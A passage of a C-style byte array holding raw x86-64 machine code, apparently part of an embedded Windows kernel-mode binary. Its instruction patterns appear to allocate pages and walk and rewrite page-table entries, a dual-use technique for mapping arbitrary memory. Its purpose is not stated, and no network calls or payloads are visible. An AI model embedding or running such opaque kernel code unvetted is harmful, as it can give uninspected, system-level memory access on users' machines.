    0xE8, 0xCB, 0x1C, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x5D, 0x48, 0x89, 0xF9, 0x31, 0xD2, 0xFF, 0x15,
    0x94, 0x87, 0x00, 0x00, 0x89, 0xC6, 0x85, 0xC0, 0x78, 0x70, 0x48, 0x89, 0xF8, 0x48, 0x87, 0x05,
    0x0C, 0x34, 0x04, 0x00, 0x48, 0x87, 0x3D, 0x0D, 0x34, 0x04, 0x00, 0x48, 0x8D, 0x0D, 0x9F, 0x61,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0xCD, 0x73, 0x00, 0x00, 0xEB, 0x39, 0x48, 0x8D, 0x0D, 0xA3, 0x63,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0xC5, 0x73, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7C, 0x63, 0x00, 0x00,
    0xFF, 0x15, 0x92, 0x88, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x24, 0x48, 0x8D, 0x0D,
    0x20, 0x5D, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xBA, 0x63, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x9A, 0x73, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x51, 0x63, 0x00, 0x00, 0xFF, 0x15, 0x67, 0x88, 0x00,
    0x00, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x38, 0x5F, 0x5E, 0xC3, 0x48, 0x8D, 0x0D, 0xB8, 0x50, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x76, 0x73, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x2D, 0x63, 0x00, 0x00, 0x41,
    0x89, 0xF1, 0xFF, 0x15, 0x40, 0x88, 0x00, 0x00, 0xEB, 0xD7, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x4C, 0x89, 0xC6, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCB,
    0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x29, 0x87, 0x00, 0x00, 0x48,
    0x8D, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x74, 0x24, 0x20, 0xC6, 0x44,
    0x24, 0x28, 0x00, 0x48, 0x89, 0xC1, 0x48, 0x89, 0xFA, 0x49, 0x89, 0xC0, 0x49, 0x89, 0xD9, 0xFF,
    0x15, 0x43, 0x86, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x94, 0xC1, 0x48, 0x39, 0x74, 0x24, 0x38, 0x0F,
    0x94, 0xC0, 0x20, 0xC8, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xD2, 0x74, 0x0B, 0x41, 0xFF, 0xC8, 0x41, 0x85, 0xC8, 0x74, 0x06, 0x31, 0xC0, 0xC3,
    0xB0, 0x01, 0xC3, 0x48, 0x8D, 0x04, 0x0A, 0x48, 0xFF, 0xC8, 0x48, 0x39, 0xC8, 0x0F, 0x93, 0xC1,
    0x48, 0x3B, 0x05, 0x11, 0x86, 0x00, 0x00, 0x0F, 0x92, 0xC0, 0x20, 0xC8, 0xC3, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x44,
    0x89, 0xC6, 0x41, 0x89, 0xD6, 0x48, 0x89, 0xCF, 0xE8, 0x93, 0x2E, 0x00, 0x00, 0x84, 0xC0, 0x74,
    0x6E, 0x48, 0x8B, 0x05, 0xE0, 0x87, 0x00, 0x00, 0x48, 0x8D, 0x1C, 0x7F, 0x48, 0xC1, 0xE3, 0x04,
    0x48, 0x03, 0x18, 0x40, 0x84, 0xF6, 0x74, 0x13, 0x48, 0x89, 0xD9, 0xBA, 0x03, 0x00, 0x00, 0x00,
    0xFF, 0x15, 0x82, 0x85, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x76, 0x40, 0xB6, 0x01, 0x41, 0xFF,
    0xCE, 0x41, 0x83, 0xFE, 0x04, 0x77, 0x58, 0x48, 0x8D, 0x05, 0xBE, 0x41, 0x00, 0x00, 0x4A, 0x63,
    0x0C, 0xB0, 0x48, 0x01, 0xC1, 0xFF, 0xE1, 0x81, 0x3D, 0x37, 0x88, 0x00, 0x00, 0xF0, 0x55, 0x00,
    0x00, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xBF, 0xFF, 0x48, 0xB9, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFB, 0xFF, 0x48, 0x0F, 0x43, 0xC8, 0x48, 0x21, 0x4B, 0x28, 0xEB, 0x20, 0x48,
    0x8D, 0x0D, 0xF9, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x31, 0x72, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0xDA, 0x42, 0x00, 0x00, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0xFB, 0x86, 0x00, 0x00, 0x31, 0xF6, 0x89,
    0xF0, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F,
    0xC3, 0x48, 0x8D, 0x0D, 0x25, 0x4D, 0x00, 0x00, 0xEB, 0xCC, 0x81, 0x3D, 0xD4, 0x87, 0x00, 0x00,
    0xF4, 0x65, 0x00, 0x00, 0xB8, 0x62, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x32, 0x00, 0x00, 0x00, 0x44,
    0x0F, 0x43, 0xC0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0xAF, 0x84, 0x00,
    0x00, 0x85, 0xC0, 0x0F, 0x88, 0xC7, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x30, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xD9, 0x31, 0xD2, 0xFF, 0x15, 0xAE, 0x86, 0x00, 0x00, 0xEB, 0xA3, 0x80, 0x4B, 0x23, 0x80,
    0xEB, 0x9D, 0x80, 0x4B, 0x1F, 0x80, 0xEB, 0x97, 0x49, 0x89, 0xFF, 0x49, 0xC1, 0xE7, 0x0C, 0x4C,
    0x89, 0xF9, 0xFF, 0x15, 0xC8, 0x84, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x48, 0x89, 0x7C, 0x24, 0x20,
    0x48, 0x8D, 0x0D, 0x28, 0x47, 0x00, 0x00, 0x4C, 0x8D, 0x25, 0x96, 0x71, 0x00, 0x00, 0x4C, 0x8D,
    0x2D, 0x39, 0x42, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0x4D, 0x89, 0xE8, 0x49, 0x89, 0xC1, 0xFF, 0x15,
    0x54, 0x86, 0x00, 0x00, 0x48, 0xC7, 0x43, 0x08, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xFF,
    0x15, 0x8B, 0x84, 0x00, 0x00, 0x48, 0x89, 0xC3, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0x93, 0x46, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0x4D, 0x89, 0xE8, 0x49, 0x89, 0xC1, 0xFF, 0x15, 0x25,
    0x86, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1E, 0x86, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x74, 0x15, 0x4C,
    0x39, 0xF3, 0x75, 0x10, 0x48, 0x8D, 0x0D, 0x01, 0x6A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x42, 0x71,
    0x00, 0x00, 0xEB, 0x0E, 0x48, 0x8D, 0x0D, 0x69, 0x69, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x14, 0x71,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC5, 0x41, 0x00, 0x00, 0xFF, 0xD0, 0xE9, 0xEF, 0xFE, 0xFF, 0xFF,
    0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xF2, 0x6D, 0x00, 0x00, 0xE9, 0xC6, 0xFE, 0xFF, 0xFF,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x45,
    0x31, 0xC0, 0x45, 0x31, 0xC9, 0xFF, 0x15, 0x65, 0x83, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x2A,
    0x48, 0x89, 0xC7, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0x49, 0x89, 0xF0, 0xFF, 0x15, 0xB7, 0x85, 0x00,
    0x00, 0x48, 0x89, 0xF9, 0xE8, 0x37, 0x17, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x10, 0x00, 0x00, 0x73,
    0x12, 0x48, 0x8D, 0x1D, 0x97, 0x63, 0x00, 0x00, 0xEB, 0x29, 0x48, 0x8D, 0x1D, 0x5E, 0x63, 0x00,
    0x00, 0xEB, 0x2C, 0x48, 0xC1, 0xF8, 0x0C, 0x8B, 0x15, 0xEF, 0x82, 0x00, 0x00, 0x48, 0x89, 0xC1,
    0x45, 0x31, 0xC0, 0xE8, 0xC8, 0xFD, 0xFF, 0xFF, 0x84, 0xC0, 0x75, 0x2C, 0x48, 0x8D, 0x1D, 0x93,
    0x63, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x48, 0x89, 0xF2, 0xFF, 0x15, 0x19, 0x83, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x78, 0x70, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7E, 0x57, 0x00, 0x00, 0x48, 0x89, 0xD9,
    0xFF, 0x15, 0x42, 0x85, 0x00, 0x00, 0x31, 0xFF, 0x48, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x20, 0x5B,
    0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x89, 0xCF, 0x48, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x15, 0x4A, 0x83, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x93, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xC6, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0x49, 0x89, 0xF8, 0xFF, 0x15, 0x08, 0x85, 0x00, 0x00,
    0x31, 0xC0, 0x48, 0x81, 0xFF, 0x00, 0x00, 0x20, 0x00, 0x0F, 0x94, 0xC0, 0x48, 0x81, 0xFF, 0x00,
    0x00, 0x00, 0x40, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x0F, 0x45, 0xD0, 0x48, 0x89, 0xF1, 0xE8, 0x4D,
    0x27, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x63, 0x48, 0x89, 0xC7, 0x8B, 0x15, 0x3B, 0x82, 0x00,
    0x00, 0x48, 0x89, 0xC1, 0x45, 0x31, 0xC0, 0xE8, 0x14, 0xFD, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0x5D,
    0x48, 0x8B, 0x05, 0x11, 0x85, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x7F, 0x48, 0xC1, 0xE1, 0x04, 0x48,
    0x03, 0x08, 0xBA, 0x03, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xBB, 0x82, 0x00, 0x00, 0x48, 0x85, 0xC0,
    0x75, 0x61, 0x48, 0x8D, 0x0D, 0xD4, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAE, 0x6F, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x04, 0x40, 0x00, 0x00, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0x78, 0x84, 0x00, 0x00,
    0xEB, 0x3F, 0x48, 0x8D, 0x0D, 0xC5, 0x62, 0x00, 0x00, 0xEB, 0x22, 0x48, 0x89, 0xF1, 0xFF, 0x15,
    0x14, 0x82, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x64, 0x62, 0x00, 0x00, 0xEB, 0x10, 0x48, 0x89, 0xF1,
    0xFF, 0x15, 0x02, 0x82, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x79, 0x62, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x6A, 0x6F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC0, 0x3F, 0x00, 0x00, 0xFF, 0x15, 0x37, 0x84, 0x00,
    0x00, 0x31, 0xF6, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x98,
    0x00, 0x00, 0x00, 0x48, 0x89, 0x94, 0x24, 0x88, 0x00, 0x00, 0x00, 0xBD, 0x0D, 0x00, 0x00, 0xC0,
    0x48, 0x89, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x33, 0x08, 0x00,
    0x00, 0x4D, 0x89, 0xC6, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x27, 0x08, 0x00, 0x00, 0x44, 0x89, 0xCF,
    0x31, 0xC0, 0x41, 0x83, 0xF9, 0x01, 0x0F, 0x94, 0xC0, 0x48, 0x8D, 0x0D, 0xD1, 0x6F, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0xCE, 0x6F, 0x00, 0x00, 0x48, 0x0F, 0x44, 0xD1, 0x41, 0x83, 0xF9, 0x02, 0x48,
    0x8D, 0x44, 0xC0, 0x0C, 0xB9, 0x1E, 0x00, 0x00, 0x00, 0x48, 0x0F, 0x45, 0xC8, 0x48, 0x89, 0x4C,
    0x24, 0x78, 0x8D, 0x47, 0xFF, 0x89, 0x44, 0x24, 0x64, 0x48, 0x8D, 0x05, 0xA9, 0x6F, 0x00, 0x00,
    0x48, 0x0F, 0x45, 0xC2, 0x48, 0x89, 0x44, 0x24, 0x68, 0xB8, 0x00, 0x00, 0x00, 0x40, 0xB9, 0x00,
    0x00, 0x20, 0x00, 0x48, 0x0F, 0x44, 0xC8, 0x48, 0x89, 0x4C, 0x24, 0x70, 0x31, 0xF6, 0x4C, 0x89,
    0x74, 0x24, 0x58, 0xBD, 0x41, 0x01, 0x00, 0xC0, 0x49, 0x89, 0xF5, 0x48, 0x8B, 0x4C, 0x24, 0x78,
    0x49, 0xD3, 0xE5, 0x83, 0x7C, 0x24, 0x64, 0x02, 0x73, 0x26, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0xE8,
    0x3C, 0xFE, 0xFF, 0xFF, 0x49, 0x89, 0xC7, 0x48, 0x85, 0xC0, 0x75, 0x78, 0xE9, 0x94, 0x06, 0x00,
    0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xB9, 0x00, 0x10, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9,
    0xFF, 0x15, 0xDA, 0x80, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x70, 0x06, 0x00, 0x00, 0x49,
    0x89, 0xC7, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0xFF, 0x15, 0x25,
    0x83, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xE8, 0xA5, 0x14, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x10, 0x00,
    0x00, 0x0F, 0x82, 0x6E, 0x06, 0x00, 0x00, 0x48, 0xC1, 0xF8, 0x0C, 0x8B, 0x15, 0x6B, 0x80, 0x00,
    0x00, 0x48, 0x89, 0xC1, 0x45, 0x31, 0xC0, 0xE8, 0x44, 0xFB, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84,
    0x5A, 0x06, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0x89, 0xFA, 0xE8, 0x52, 0x25, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x0F, 0x84, 0x0D, 0x07, 0x00, 0x00, 0x48, 0x89, 0xC3, 0x4C, 0x03, 0xAC, 0x24, 0x88, 0x00,
    0x00, 0x00, 0x48, 0xFF, 0xC6, 0x48, 0x8B, 0x44, 0x24, 0x68, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C,
    0x89, 0x74, 0x24, 0x28, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xAA, 0x74, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0xCD, 0x6D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE2, 0x53, 0x00, 0x00, 0x4D, 0x89,
    0xE9, 0xFF, 0x15, 0x91, 0x82, 0x00, 0x00, 0x4D, 0x89, 0xEE, 0x49, 0xC1, 0xEE, 0x24, 0x41, 0x81,
    0xE6, 0xF8, 0x0F, 0x00, 0x00, 0x4C, 0x03, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x08,
    0x00, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x50, 0x45, 0x31, 0xC9, 0xE8, 0xED,
    0x1C, 0x00, 0x00, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x41, 0xF6, 0xC4, 0x01, 0x0F, 0x85, 0x26, 0x01,
    0x00, 0x00, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xC0, 0x45,
    0x31, 0xC9, 0xFF, 0x15, 0xE8, 0x7F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x4B, 0x05, 0x00,
    0x00, 0x49, 0x89, 0xC4, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0xFF,
    0x15, 0x33, 0x82, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0xB3, 0x13, 0x00, 0x00, 0x48, 0x3D, 0x00,
    0x10, 0x00, 0x00, 0x0F, 0x82, 0x2F, 0x05, 0x00, 0x00, 0x48, 0xC1, 0xF8, 0x0C, 0x8B, 0x15, 0x79,
    0x7F, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x45, 0x31, 0xC0, 0xE8, 0x52, 0xFA, 0xFF, 0xFF, 0x84, 0xC0,
    0x0F, 0x84, 0x1B, 0x05, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x50, 0x07, 0x00, 0x00, 0x00, 0x4C,
    0x89, 0xE1, 0xE8, 0x79, 0x13, 0x00, 0x00, 0x48, 0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00,
    0x00, 0x48, 0x21, 0xC8, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0xBA, 0xFF, 0x0F, 0x00, 0x00, 0x00,
    0x00, 0xFF, 0xFF, 0x48, 0x21, 0xD1, 0x48, 0x09, 0xC1, 0x48, 0x89, 0x4C, 0x24, 0x50, 0x41, 0xB8,
    0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x50, 0x45, 0x31, 0xC9, 0xE8,
    0x5C, 0x1D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xEC, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xF5,
    0x81, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0xC1, 0xE9, 0x0C, 0x48, 0xBA, 0xFF, 0xFF,
    0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD1, 0x48, 0x8D, 0x0C, 0x49, 0x48, 0xC1, 0xE1,
    0x04, 0x48, 0x03, 0x08, 0xBA, 0x03, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x89, 0x7F, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x0F, 0x84, 0x0C, 0x05, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0xB0, 0x12, 0x00, 0x00,
    0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x31, 0x71, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x71,
    0x6C, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x39, 0x74, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0xFF, 0x15, 0x35,
    0x81, 0x00, 0x00, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x48, 0xB8, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x49, 0x21, 0xC4, 0x0F, 0x84, 0x59, 0x05, 0x00, 0x00, 0x83, 0xFF, 0x02, 0x75, 0x50,
    0x48, 0xC1, 0xE3, 0x1E, 0x48, 0x05, 0x00, 0x10, 0x00, 0xC0, 0x48, 0x21, 0xD8, 0x48, 0x0D, 0x87,
    0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x49, 0xC1, 0xED, 0x1B, 0x41, 0x81, 0xE5, 0xF8,
    0x0F, 0x00, 0x00, 0x4D, 0x09, 0xEC, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0x48,
    0x8D, 0x54, 0x24, 0x48, 0x45, 0x31, 0xC9, 0xE8, 0x94, 0x1C, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xE8,
    0x2C, 0x12, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x82, 0x3F, 0x00, 0x00, 0xE9, 0x88, 0x03, 0x00, 0x00,
    0x4C, 0x89, 0xE8, 0x48, 0xC1, 0xE8, 0x1B, 0x25, 0xF8, 0x0F, 0x00, 0x00, 0x49, 0x09, 0xC4, 0x41,
    0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0x48, 0x8D, 0x54, 0x24, 0x48, 0x45, 0x31, 0xC9,
    0xE8, 0x2B, 0x1B, 0x00, 0x00, 0x4C, 0x8B, 0x74, 0x24, 0x48, 0x41, 0xF6, 0xC6, 0x01, 0x0F, 0x85,
    0x26, 0x01, 0x00, 0x00, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31,
    0xC0, 0x45, 0x31, 0xC9, 0xFF, 0x15, 0x26, 0x7E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x89,
    0x03, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x31,
    0xD2, 0xFF, 0x15, 0x71, 0x80, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xE8, 0xF1, 0x11, 0x00, 0x00, 0x48,
    0x3D, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x82, 0x00, 0x04, 0x00, 0x00, 0x48, 0xC1, 0xF8, 0x0C, 0x8B,
    0x15, 0xB7, 0x7D, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x45, 0x31, 0xC0, 0xE8, 0x90, 0xF8, 0xFF, 0xFF,
    0x84, 0xC0, 0x0F, 0x84, 0xEC, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x07, 0x00, 0x00,
    0x00, 0x4C, 0x89, 0xF1, 0xE8, 0xB7, 0x11, 0x00, 0x00, 0x48, 0xB9, 0x00, 0xF0, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x00, 0x48, 0x21, 0xC8, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0xBA, 0xFF, 0x0F, 0x00,
    0x00, 0x00, 0x00, 0xFF, 0xFF, 0x48, 0x21, 0xD1, 0x48, 0x09, 0xC1, 0x48, 0x89, 0x4C, 0x24, 0x48,
    0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0x48, 0x8D, 0x54, 0x24, 0x48, 0x45, 0x31,
    0xC9, 0xE8, 0x9A, 0x1B, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xC4, 0x03, 0x00, 0x00, 0x48, 0x8B,
    0x05, 0x33, 0x80, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0xC1, 0xE9, 0x0C, 0x48, 0xBA,
    0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD1, 0x48, 0x8D, 0x0C, 0x49, 0x48,
    0xC1, 0xE1, 0x04, 0x48, 0x03, 0x08, 0xBA, 0x03, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xC7, 0x7D, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xA2, 0x03, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xE8, 0xEE, 0x10,
    0x00, 0x00, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x6F, 0x6F, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0xAF, 0x6A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x77, 0x72, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xFF,
    0x15, 0x73, 0x7F, 0x00, 0x00, 0x4C, 0x8B, 0x74, 0x24, 0x48, 0x48, 0xB8, 0x00, 0xF0, 0xFF, 0xFF,
    0xFF, 0xFF, 0x00, 0x00, 0x49, 0x21, 0xC6, 0x0F, 0x84, 0x97, 0x03, 0x00, 0x00, 0x83, 0xFF, 0x01,
    0x75, 0x61, 0x48, 0xC1, 0xE3, 0x15, 0x48, 0x05, 0x00, 0x10, 0xE0, 0xFF, 0x48, 0x21, 0xD8, 0x48,
    0x0D, 0x87, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x41, 0xC1, 0xED, 0x12, 0x41, 0x81,
    0xE5, 0xF8, 0x0F, 0x00, 0x00, 0x4D, 0x09, 0xEE, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89,
    0xF1, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x45, 0x31, 0xC9, 0xE8, 0xD2, 0x1A, 0x00, 0x00, 0x4C, 0x89,
    0xF9, 0xE8, 0x6A, 0x10, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1D, 0x3E, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x30, 0x6A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x45, 0x50, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xE9, 0xC6,
    0x01, 0x00, 0x00, 0x44, 0x89, 0xE8, 0xC1, 0xE8, 0x12, 0x25, 0xF8, 0x0F, 0x00, 0x00, 0x49, 0x09,
    0xC6, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x45,
    0x31, 0xC9, 0xE8, 0x59, 0x19, 0x00, 0x00, 0x4C, 0x8B, 0x64, 0x24, 0x40, 0x41, 0xF6, 0xC4, 0x01,
    0x0F, 0x85, 0x26, 0x01, 0x00, 0x00, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF,
    0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9, 0xFF, 0x15, 0x54, 0x7C, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F,
    0x84, 0xB7, 0x01, 0x00, 0x00, 0x49, 0x89, 0xC4, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89,
    0xC1, 0x31, 0xD2, 0xFF, 0x15, 0x9F, 0x7E, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0x1F, 0x10, 0x00,
    0x00, 0x48, 0x3D, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x82, 0x9B, 0x01, 0x00, 0x00, 0x48, 0xC1, 0xF8,
    0x0C, 0x8B, 0x15, 0xE5, 0x7B, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x45, 0x31, 0xC0, 0xE8, 0xBE, 0xF6,
    0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0x87, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x07,
    0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0xE5, 0x0F, 0x00, 0x00, 0x48, 0xB9, 0x00, 0xF0, 0xFF,
    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x21, 0xC8, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0xBA, 0xFF,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x48, 0x21, 0xD1, 0x48, 0x09, 0xC1, 0x48, 0x89, 0x4C,
